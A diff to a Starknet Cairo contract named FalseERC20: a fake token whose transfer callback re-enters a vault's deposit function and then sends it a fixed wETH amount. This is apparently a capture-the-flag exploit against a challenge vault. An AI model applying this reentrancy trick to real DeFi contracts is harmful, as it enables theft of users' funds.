@@ -1,5 +1,6 @@
 #[starknet::contract]
 mod FalseERC20 {
+    use core::debug::PrintTrait;
     use core::traits::Into;
     use starknet::{
         ClassHash, ContractAddress, contract_address_to_felt252, get_caller_address,
@@ -111,14 +112,13 @@ mod FalseERC20 {
             let call_count: u32 = self.total_call_count.read();
             if (call_count == 0) {
                 // First call
-                self.total_call_count.write(call_count);
-                let increased_amount = 995000000000000000000; // 995 ETH
+                self.total_call_count.write(call_count + 1);
                 ISubDefiVaultDispatcher { contract_address: self.wETH_vault.read() }
-                    .deposit(increased_amount, self.owner.read(), get_contract_address());
+                    .deposit(amount, self.owner.read(), get_contract_address());
             } else if (call_count == 1) {
                 // Second call
                 IERC20CamelDispatcher { contract_address: self.wETH.read() }
-                    .transfer(self.wETH_vault.read(), amount);
+                    .transfer(self.wETH_vault.read(), 5000000000000000000);
             }
             true
         }
